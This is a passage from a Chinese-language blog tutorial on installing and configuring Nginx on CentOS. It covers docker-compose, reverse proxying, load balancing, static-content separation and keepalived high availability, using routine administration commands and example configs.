&lt;p&gt;OpenSSL 是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及 SSL 协议，并提供丰富的应用程序供测试或其它目的使用。nginx 不仅支持 http 协议，还支持 https（即在ssl协议上传输http），所以需要在 Centos 安装 OpenSSL 库。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;yum install -y openssl openssl-devel
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;zlib安装&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;zlib库提供了很多种压缩和解压缩方式，nginx使用zlib对http包的内容进行gzip，所以需要安装&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;yum install -y zlib zlib-devel
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;nginx安装，启动、停止&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# 1.下载nginx安装包
wget -c https://nginx.org/download/nginx-1.12.0.tar.gz
# 解压压缩包到指定目录并切换到该目录下
tar -zxvf nginx-1.12.0.tar.gz
cd nginx-1.12.0
# 执行三个命令
./configure #使用默认配置,其实在 nginx-1.12.0 版本中你就不需要去配置相关东西,默认就可以了。
make #编译
make install #安装
# 查找安装路径并进入
whereis nginx
# 启动、停止nginx
cd /usr/local/nginx/sbin/
./nginx -v              #查看nginx版本号
./nginx                 #启动
./nginx -s stop #此方式相当于先查出nginx进程id再使用kill命令强制杀掉进程
./nginx -s quit #此方式停止步骤是待nginx进程处理任务完毕进行停止
./nginx -s reload 

#启动时报80端口被占用解决办法：安装net-tool 包：
yum install net-tools
#查询nginx进程
ps aux|grep nginx
#重启 nginx
#  方式一：先停止再启动（推荐）
./nginx -s quit
./nginx
#  方式二：重新加载配置文件，当 ngin x的配置文件 nginx.conf 修改后，要想让配置生效需要重启 nginx，使用下面的命令不用先停止 nginx 再启动,nginx 即可将配置信息在 nginx 中生效，如下：
./nginx -s reload
# 开机自启动(在rc.local增加启动代码即可)
vi /etc/rc.local  # 添加：/usr/local/nginx/sbin/nginx
chmod 755 rc.local # 设置执行权限
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;防火墙相关&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# 查看开放的端口号
firewall-cmd --list-all
# 查询端口号80 是否开启：
firewall-cmd --query-port=80/tcp
# 永久开放80端口号：
firewall-cmd --permanent --zone=public --add-port=80/tcp
# 启动|关闭|重新启动  防火墙
systemctl [start|stop|restart] firewalld.service
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;22-使用docker-compose-安装nginx&quot;&gt;2.2 使用docker-compose 安装Nginx&lt;/h5&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;下面以本人搭建的博客系统为例，看不懂的先看后面章节&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;创建docker-compose.yml&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;version: '3.1'
services:
  nginx:
    restart: always
    image: nginx:1.19.2-alpine 
    container_name: polaris-nginx # nginx容器名
    ports:
      - 80:80       # http默认端口
      - 443:443     # https默认端口
    volumes:
      - &quot;./conf/nginx.conf:/etc/nginx/nginx.conf&quot;
      - &quot;./wwwroot:/usr/share/nginx/wwwroot&quot;
      - &quot;./log:/var/log/nginx&quot;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;创建配置文件nginx.conf&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;user  nginx;
worker_processes  1; # 进程数，建议按照cpu 数目来指定，一般为它的倍数。

error_log  /var/log/nginx/error.log warn;
pid        /var/run/nginx.pid;


events {
    worker_connections  1024; # 单个后台worker process进程的最大并发链接数  
}


http {
        # upstream ↓
        # down 表示当前的server暂时不参与负载
        # weight 加权轮询权重,默认为1。weight越大，负载的权重就越大。
        # backup 备用服务器, 当其他所有的非backup机器出现故障或者忙的时候，才会请求backup机器，因此这台机器的压力最轻。
        # max_fails 允许请求失败的次数默认为1。当超过最大次数时，返回proxy_next_upstream 模块定义的错误
        # fail_timeout max_fails次失败后，暂停的时间。
        # 名字不能用下划线,否则访问不到
        
        # 博客后端，多个可以实现负载均衡（根据权重）
    upstream polaris-blog-system{
           server 172.20.147.156:8080 weight=1;
    }
        
        # 门户
        upstream polaris-blog-portal{
                server 172.20.147.156:3000 weight=1;      
        }

        #设定mime类型,类型由mime.type文件定义
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

        # 设定日志格式
    log_format  main  '$remote_addr - $remote_user [$time_local] &quot;$request&quot; '
                      '$status $body_bytes_sent &quot;$http_referer&quot; '
                      '&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;';

    access_log  /var/log/nginx/access.log  main;


    #sendfile 指令指定 nginx 是否调用 sendfile 函数（zero copy 方式）来输出文件，
        # 对于普通应用，必须设为 on,
    # 如果用来进行下载等应用磁盘IO重负载应用，可设置为 off，
    # 以平衡磁盘与网络I/O处理速度，降低系统的uptime.
    sendfile on;
        
    # tcp_nopush     on;

        # 用于设置客户端连接保持活动的超时时间，在超过这个时间之后服务器会关闭该链接。
    keepalive_timeout  65;

    #开启gzip压缩
    gzip  on;
    gzip_disable &quot;MSIE [1-6].&quot;;
        
        # 设定请求缓冲
    client_header_buffer_size    128k;
    large_client_header_buffers  4 128k;

        # 允许客户端请求的最大单文件字节数
        client_max_body_size 50m;
   
        # 服务器名字的hash表大小
        server_names_hash_bucket_size 128;
        
        # header中自定义变量时支持下划线
        underscores_in_headers on; 
    
        
        server {
                listen       80;
                server_name  www.mpolaris.top;# 这个是门户的访问域名，指向http://polaris-blog-portal
                
                #location ^~/shop/ {
                #       proxy_pass https://api.mpolaris.net/; # 商城，还未开发
                #}
                
                location ^~/portal/ {
                        proxy_pass   http://polaris-blog-system;
                        # 以下是一些反向代理的配置可删除
                        proxy_redirect             off;
                        # 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP
                        proxy_set_header           Host $host;
                        proxy_set_header           Cookie $http_cookie;
                        proxy_set_header           X-Real-IP $remote_addr;
                        proxy_set_header           X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header           HTTP_X_FORWARDED_FOR $remote_addr;
                        proxy_set_header           X-Forwarded-Server $host;
                }
                
                location ^~/user/ {
                        proxy_pass   http://polaris-blog-system;
                        # 以下是一些反向代理的配置可删除
                        proxy_redirect             off;
                        # 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP
                        proxy_set_header           Host $host;
                        proxy_set_header           Cookie $http_cookie;
                        proxy_set_header           X-Real-IP $remote_addr;
                        proxy_set_header           X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header           HTTP_X_FORWARDED_FOR $remote_addr;
                        proxy_set_header           X-Forwarded-Server $host;
                }

                location / {
                        proxy_pass   http://polaris-blog-portal;
                        # 以下是一些反向代理的配置可删除
                        proxy_redirect             off;
                        # 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP
                        proxy_set_header           Host $host;
                        proxy_set_header           Cookie $http_cookie;
                        proxy_set_header           X-Real-IP $remote_addr;
                        proxy_set_header           X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header           HTTP_X_FORWARDED_FOR $remote_addr;
                        proxy_set_header           X-Forwarded-Server $host;
                }
                
    }
        
        server {
                listen       80;
                server_name  mp.mpolaris.top; # 这个是管理中心的访问域名

                #charset koi8-r;
                #access_log  /var/log/nginx/host.access.log  main;
                
                
                # 用户相关的请求，转到polaris_blog
                location ^~/user/ {
            proxy_pass   http://polaris-blog-system;
                        # 以下是一些反向代理的配置可删除
                        proxy_redirect             off; 
                        # 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP
                        proxy_set_header           Host $host;
                        proxy_set_header                   Cookie $http_cookie;
                        proxy_set_header           X-Real-IP $remote_addr; 
                        proxy_set_header           X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header           HTTP_X_FORWARDED_FOR $remote_addr;
                        proxy_set_header           X-Forwarded-Server $host;
        }
        
                location ^~/admin/ {
                proxy_pass   http://polaris-blog-system;
                        # 以下是一些反向代理的配置可删除
                        proxy_redirect             off; 
                        # 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP
                        proxy_set_header           Host $host;
                        proxy_set_header                   Cookie $http_cookie;
                        proxy_set_header           X-Real-IP $remote_addr; 
                        proxy_set_header           X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header           HTTP_X_FORWARDED_FOR $remote_addr;
                        proxy_set_header           X-Forwarded-Server $host;
        }
        
        location ^~/portal/ {
                proxy_pass    http://polaris-blog-system;
                        # 以下是一些反向代理的配置可删除
                        proxy_redirect             off; 
                        # 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP
                        proxy_set_header           Host $host;
                        proxy_set_header                   Cookie $http_cookie;
                        proxy_set_header           X-Real-IP $remote_addr; 
                        proxy_set_header           X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header           HTTP_X_FORWARDED_FOR $remote_addr;
                        proxy_set_header           X-Forwarded-Server $host;
        }

                # 其他访问访问wwwroot/mp
                location / {
                        # 此处解决刷新页面出现404的问题
                        try_files $uri $uri/ /index.html;
                    root   /usr/share/nginx/wwwroot/mp;
                        index  index.html index.htm;
                }
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;3-配置文件&quot;&gt;3. 配置文件&lt;/h4&gt;
&lt;h5 id=&quot;31-nginxconf&quot;&gt;3.1 nginx.conf&lt;/h5&gt;
&lt;p&gt;nginx 安装目录下其默认的配置文件都放在这个目录的 conf 目录下，而主配置文件nginx.conf 也在其中，对 nginx 的使用基本上都是对此配置文件进行相应的修改。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/Nginx/20210113225458.png&quot; alt=&quot;image-20210101223821389&quot;/&gt;&lt;p&gt;根据nginx.conf配置文件，可将其分为三部分&lt;/p&gt;
&lt;h5 id=&quot;32-第一部分：全局块&quot;&gt;3.2 第一部分：全局块&lt;/h5&gt;
&lt;p&gt;从配置文件开始到 events 块之间的内容，主要会设置一些影响 nginx 服务器整体运行的配置指令，主要包括配置运行 Nginx 服务器的用户（组），允许生成的 worker process 数，进程 PID 存放路径、日志存放路径和类型以及配置文件的引入等。&lt;/p&gt;
&lt;p&gt;如下配置，这是 Nginx 服务器并发处理服务的关键配置，worker_processes 值越大，可以支持的并发处理量也越多，但是会受到硬件、软件等设备的制约。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;worker_processes 1;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;33-第二部分：events块&quot;&gt;3.3 第二部分：events块&lt;/h5&gt;
&lt;p&gt;events 块涉及的指令主要影响 Nginx 服务器与用户的网络连接，常用的设置包括是否开启对多 work process 下的网络连接进行序列化，是否允许同时接收多个网络连接，选取哪种事件驱动模型来处理连接请求，每个 word process 可以同时支持的最大连接数等。&lt;/p&gt;
&lt;p&gt;这部分的配置对 Nginx 的性能影响较大，在实际中应该灵活配置。&lt;/p&gt;
&lt;p&gt;如下例子就表示每个 work process 支持的最大连接数为 1024。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;events {
        worker_connections 1024;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;34-第三部分：http块&quot;&gt;3.4 第三部分：http块&lt;/h5&gt;
&lt;p&gt;http块算是 Nginx 服务器配置中最频繁的部分，代理、缓存和日志定义等绝大多数功能和第三方模块的配置都在这里。 需要注意的是：http 块也可以包括 &lt;strong&gt;http 全局块&lt;/strong&gt;、&lt;strong&gt;server 块&lt;/strong&gt;。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;http {
    include       mime.types;
    default_type  application/octet-stream;
    
    sendfile on;
    
    keepalive_timeout  65;   
        
        server {
                listen       80;
                server_name  localhost

                location / {
                        root   html;
                        index  index.html index.htm;
                }
                
                error_page 500 502 503 504 /50x.html;
                
                location = /50x.html {
                        root   html;
                }
                
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;http全局块&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;http 全局块配置的指令包括文件引入、MIME-TYPE 定义、日志自定义、连接超时时间、单链接请求数上限等。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;server块&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这块和虚拟主机有密切关系，虚拟主机从用户角度看，和一台独立的硬件主机是完全一样的，该技术的产生是为了节省互联网服务器硬件成本。&lt;/p&gt;
&lt;p&gt;每个 http 块可以包括多个 server 块，而每个 server 块就相当于一个虚拟主机。而每个 server 块也分为全局 server 块，以及可以同时包含多个 locaton 块。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;全局 server 块&lt;/code&gt;：常见的配置是本虚拟机主机的监听配置和本虚拟主机的名称或 IP 配置。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location 块&lt;/code&gt;：一个 server 块可以配置多个 location 块。这块的主要作用是基于 Nginx 服务器接收到的请求字符串（例如 server_name/uri-string），对虚拟主机名称（也可以是 IP 别名）之外的字符串（例如 前面的 /uri-string）进行匹配，对特定的请求进行处理。地址定向、数据缓存和应答控制等功能，还有许多第三方模块的配置也在这里进行。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;//location指令说明：location指令用于匹配URL，语法如下
location [ = | ~ | ~* | ^~] uri {
    
}
// ① = ：用于不含正则表达式的 uri 前，要求请求字符串与 uri 严格匹配，如果匹配成功，就停止继续向下搜索并立即处理该请求。
// ② ~ ：用于表示 uri 包含正则表达式，并且区分大小写。
// ③ ~* ：用于表示 uri 包含正则表达式，并且不区分大小写。
// ④ ^~ ：用于不含正则表达式的 uri 前，要求 Nginx 服务器找到标识 uri 和请求字符串匹配度最高的 location 后，立即使用此 location 处理请求，而不再使用 location 块中的正则 uri 和请求字符串做匹配。

//注意：如果 uri 包含正则表达式，则必须要有 ~ 或者 ~* 标识。
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;4-配置实例---反向代理&quot;&gt;4. 配置实例 - 反向代理&lt;/h4&gt;
&lt;h5 id=&quot;41-实例一&quot;&gt;4.1 实例一&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;实现效果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在浏览器地址栏输入地址www.123.com，就会跳转到Linux系统tomcat主页面中&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/Nginx/20210113225459.png&quot; alt=&quot;image-20210103010039415&quot;/&gt;&lt;p&gt;&lt;strong&gt;准备内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在Linux系统中安装tomcat并启动&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# 下载
wget https://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-8/v8.5.61/bin/apache-tomcat-8.5.61.tar.gz
# 解压
tar -zxvf apache-tomcat-8.5.61.tar.gz
# 进入bin目录并启动tomcat
cd apache-tomcat-8.5.61/bin
./startup.sh
# 查看tomcat日志, -f 循环读取（常用于查阅正在改变的日志文件）
tail -f catalina.out
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;nginx.conf配置&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;worker_processes  1;

events {
    worker_connections  1024;
}

http {
    include       mime.types;
    default_type  application/octet-stream;

    sendfile        on;
        
    keepalive_timeout  65;

    server {
        listen       80;
        # 访问192.168.204.130就会转发到proxy配置的地址去
        server_name  192.168.204.130; 

        location / {
                        proxy_pass http://127.0.0.1:8080;  #反向代理
                        
            root   html;
            index  index.html index.htm;
        }

       
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;42-实例二&quot;&gt;4.2 实例二&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;实现效果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用nginx反向代理，根据访问的路径跳转到不同端口的服务中。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;nginx监听端口为9001&lt;/li&gt;
&lt;li&gt;访问http://192.168.204.130:9001/edu/，直接跳转到127.0.0.1:8081&lt;/li&gt;
&lt;li&gt;访问http://192.168.204.130:9001/vod/，直接跳转到127.0.0.1:8082&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;准备内容&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;准备两个tomcat，一个8081端口，一个8082端口，并在两个tomcat中分别准备好测试的页面&lt;/li&gt;
&lt;li&gt;修改nginx的配置文件，在http块中编写server{}逻辑&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;nginx.conf配置&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;worker_processes  1;

events {
    worker_connections  1024;
}

http {
    include       mime.types;
    default_type  application/octet-stream;

    sendfile        on;

    keepalive_timeout  65;

    server {
        listen       9001;
        server_name  192.168.204.130; # 访问该地址就会转发到proxy配置的地址去

        location ~ /edu/ {
            proxy_pass http://127.0.0.1:8080;  #反向代理
        }

                location ~ /vod/ {
            proxy_pass http://127.0.0.1:8081;  #反向代理
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;5-配置实例---负载均衡&quot;&gt;5. 配置实例 - 负载均衡&lt;/h4&gt;
&lt;h5 id=&quot;51-实例&quot;&gt;5.1 实例&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;实现效果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;浏览器地址栏输入地址http://192.168.204.130/Test/test.html，实现负载均衡效果，即将平均到8080和8081端口中&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;准备工作&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;两台tomcat服务器，一个为8080端口另一个为8081端口&lt;/li&gt;
&lt;li&gt;在两台tomcat的webapps目录中，创建Test文件夹并在其中创建test.html页面用于测试&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;nginx.conf配置&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;worker_processes  1;

events {
    worker_connections  1024;
}

http {
    include       mime.types;
    default_type  application/octet-stream;

    sendfile        on;

    keepalive_timeout  65;
    
    upstream myserver {
        server 192.168.204.130:8080 weight=2;
        server 192.168.204.130:8081 weight=1;
    }

    server {
        listen       80;
        server_name  192.168.204.130;

        location / {
            proxy_pass http://myserver; # 负载均衡
            
            root html;
            index index.html index.htm;
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;52-nginx分配服务器策略&quot;&gt;5.2 nginx分配服务器策略&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;第一种：轮询（默认）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉能自动剔除&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二种：weight&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;weight 代表权重默认为 1，权重越高被分配的客户端越多&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第三种：ip_hash&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器。可以解决session共享的问题&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;upstream myServer {
        ip_hash;
        server server 192.168.204.130:8080;
        server server 192.168.204.130:8081;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;第四种：fair（第三方）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;按后端服务器的响应时间来分配请求，响应时间短的优先分配&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;upstream myServer {
        server server 192.168.204.130:8080;
        server server 192.168.204.130:8081;
        fair;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;6-配置实例---动静分离&quot;&gt;6. 配置实例 - 动静分离&lt;/h4&gt;
&lt;h5 id=&quot;61-理解&quot;&gt;6.1 理解&lt;/h5&gt;
&lt;p&gt;Nginx 动静分离简单来说就是把动态跟静态请求分开，不能理解成只是单纯的把动态页面和静态页面物理分离。严格意义上说应该是动态请求跟静态请求分开，可以理解成使用 Nginx 处理静态页面，Tomcat 处理动态页面。&lt;/p&gt;
&lt;p&gt;动静分离从目前实现角度来讲大致分为两种，一种是纯粹把静态文件独立成单独的域名放在独立的服务器上，也是目前主流推崇的方案；另外一种方法就是动态跟静态文件混合在一起发布，通过 nginx 来分开。通过 location 指定不同的后缀名实现不同的请求转发。&lt;/p&gt;
&lt;p&gt;通过 expires 参数可以设置浏览器缓存过期时间，减少与服务器之前的请求和流量。具体 Expires 定义：是给一个资源设定一个过期时间，也就是说无需去服务端验证，直接通过浏览器自身确认是否过期即可，不会产生额外的流量。此种方法非常适合不经常变动的资源。（如果经常更新的文件，不建议使用 Expires 来缓存），我这里设置 3d，表示在这 3 天之内访问这个 URL，发送一个请求，比对服务器该文件最后更新时间没有变化，则不会从服务器抓取返回状态码304，如果有修改则直接从服务器重新下载，返回状态码 200。&lt;/p&gt;
&lt;h5 id=&quot;62-实例&quot;&gt;6.2 实例&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;项目资源准备&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;nginx 配置&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;重点是添加 location，最后检查 Nginx 配置是否正确即可，然后测试动静分离是否成功，之需要删除后端 tomcat 服务器上的某个静态文件，查看是否能访问，如果可以访问说明静态资源 nginx 直接返回了，不走后端 tomcat 服务器。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;server {
    listen       80;
    server_name  192.168.204.130;

    location /image/ {
        root html/image/;
        autoindex on; #列出当前文件夹中的内容
        index index.html index.htm;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;7-搭建nginx高可用集群&quot;&gt;7. 搭建Nginx高可用集群&lt;/h4&gt;
&lt;h5 id=&quot;71-主从模式&quot;&gt;7.1 主从模式&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;图示&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/Nginx/20210113225500.png&quot; alt=&quot;image-20210113221825855&quot;/&gt;&lt;p&gt;&lt;strong&gt;搭建环境&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;两台服务器192.168.0.1与192.168.0.2&lt;/li&gt;
&lt;li&gt;在两台服务器上安装Nginx，keepalived&lt;/li&gt;
&lt;li&gt;keepalived安装成功后在/etc下生成一个文件keepalived/keepalived.conf，对其进行配置&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# 全局定义
global_defs { 
   notification_email { 
       acassen@firewall.loc 
       failover@firewall.loc 
       sysadmin@firewall.loc 
   } 
   notification_email_from Alexandre.Cassen@firewall.loc 
   smtp_server 192.168.17.129 
   smtp_connect_timeout 30 
   # 主要配置该值，通过这个服务器名字可以直接访问到ip
   router_id LVS_DEVEL   # /etc/host文件中配置：127.0.0.1 LVS_DEVEL
} 

# 检测脚本 与 权重参数
vrrp_script chk_http_port { 
   script &quot;/usr/local/src/nginx_check.sh&quot;  # 脚本路径
   interval 2   #（检测脚本执行的间隔,单位s） 
   weight 2    # 设置当前服务器的权重。例当脚本成立时当前服务器权重+2
} 
 
# 虚拟IP配置
vrrp_instance VI_1 { 
   state MASTER    # 备份服务器上将 MASTER 改为 BACKUP 
   interface ens33   # 绑定的网卡名 
   virtual_router_id 51   # 路由值，主、备机必须一样，是一个的唯一标识
   priority 100   # 主、备机取不同的优先级，主机值较大，备份机值较小 
   advert_int 1   # 每个多少时间（单位s）检测一次当前服务器
   authentication { # 权限方式，如下密码的形式，密码为1111
     auth_type PASS 
     auth_pass 1111 
   } 
   virtual_ipaddress { 
     192.168.17.50   # 虚拟IP地址 ，可以绑定多个
   } 
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;编写检测脚本文件 nginx_check.sh&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;#!/bin/bash 
A=`ps -C nginx –no-header |wc -l` 
if [ $A -eq 0 ];then 
 /usr/local/nginx/sbin/nginx  # nginx启动路径
 sleep 2 
 if [ `ps -C nginx --no-header |wc -l` -eq 0 ];then 
 killall keepalived 
 fi 
fi
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;将两台服务器上的nginx和keepalived都启动起来&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;./nginx
systemctl start keepalived.service
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;6&quot;&gt;&lt;li&gt;访问虚拟ip，查看是否能访问到nginx主页&lt;/li&gt;
&lt;li&gt;停掉主Nginx服务器后，访问虚拟ip，查看是否能访问到nginx主页&lt;/li&gt;
&lt;/ol&gt;&lt;h5 id=&quot;72-双主模式&quot;&gt;7.2 双主模式&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;图示&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/Nginx/20210113234042.png&quot; alt=&quot;image-20210113234042092&quot;/&gt;&lt;p&gt;&lt;strong&gt;搭建环境&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其他步骤与主从模式类似，只是keepalived.conf配置文件有所变化&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;#全局定义
global_defs { 
   notification_email { 
       acassen@firewall.loc 
       failover@firewall.loc 
       sysadmin@firewall.loc 
   } 
   notification_email_from Alexandre.Cassen@firewall.loc 
   smtp_server 192.168.17.129 
   smtp_connect_timeout 30 
   router_id LVS_DEVEL 
} 

# 检测脚本 与 权重参数
vrrp_script chk_http_port { 
   script &quot;/usr/local/src/nginx_check.sh&quot;  
   interval 2   
   weight 2  
} 
 
# 虚拟IP配置
vrrp_instance VI_1 { 
   state MASTER   
   interface ens33  
   virtual_router_id 51  
   priority 100   
   advert_int 1   
   authentication { 
     auth_type PASS 
     auth_pass 1111 
   } 
   virtual_ipaddress { 
     192.168.17.50 
   } 
}

# 虚拟IP配置
vrrp_instance VI_2 { 
   state BACKUP   
   interface ens33  
   virtual_router_id 52  
   priority 50   
   advert_int 1   
   authentication { 
     auth_type PASS 
     auth_pass 2222
   } 
   virtual_ipaddress { 
     192.168.17.80 
   } 
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;8-nginx原理与优化参数配置&quot;&gt;8. Nginx原理与优化参数配置&lt;/h4&gt;
&lt;h5 id=&quot;81-master--worker&quot;&gt;8.1 master &amp;amp; worker&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;master &amp;amp; worker机制&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&quot;&quot;&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/Nginx/20210113235646.png&quot; alt=&quot;image-20210113235646531&quot;/&gt;&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;master-workers 的机制的好处&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先对于每个 worker 进程来说独立的进程不需要加锁，省掉了锁带来的开销，同时在编程以及问题查找时也会方便很多。&lt;/p&gt;
&lt;p&gt;其次采用独立的进程可以让互相之间不会影响，一个进程退出后其它进程还在工作，服务不会中断，master 进程则很快启动新的worker 进程，同时还支持 &lt;span&gt;热部署(nginx -s reload)&lt;/span&gt;。当然worker 进程的异常退出肯定是程序有 bug 了，异常退出会导致当前 worker 上的所有请求失败，不过不会影响到所有请求降低了风险。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;worker如何工作&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/Nginx/20210114000115.png&quot; alt=&quot;image-20210114000115568&quot;/&gt;&lt;p&gt;&lt;strong&gt;需要设置多少个worker&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Nginx 同 Redis 类似都采用了 IO 多路复用机制（注意windows系统没有该功能），每个 worker 都是一个独立的进程，但每个进程里只有一个主线程，通过异步非阻塞的方式来处理请求， 即使是千上万个请求也不在话下。每个 worker 的线程可以把一个 cpu 的性能发挥到极致。所以 &lt;span&gt;worker 数和服务器的 cpu数相等&lt;/span&gt; 是最为适宜的。设少了会浪费 cpu，设多了会造成 cpu 频繁切换上下文带来的损耗。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;设置worker数量&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;worker_processes 4
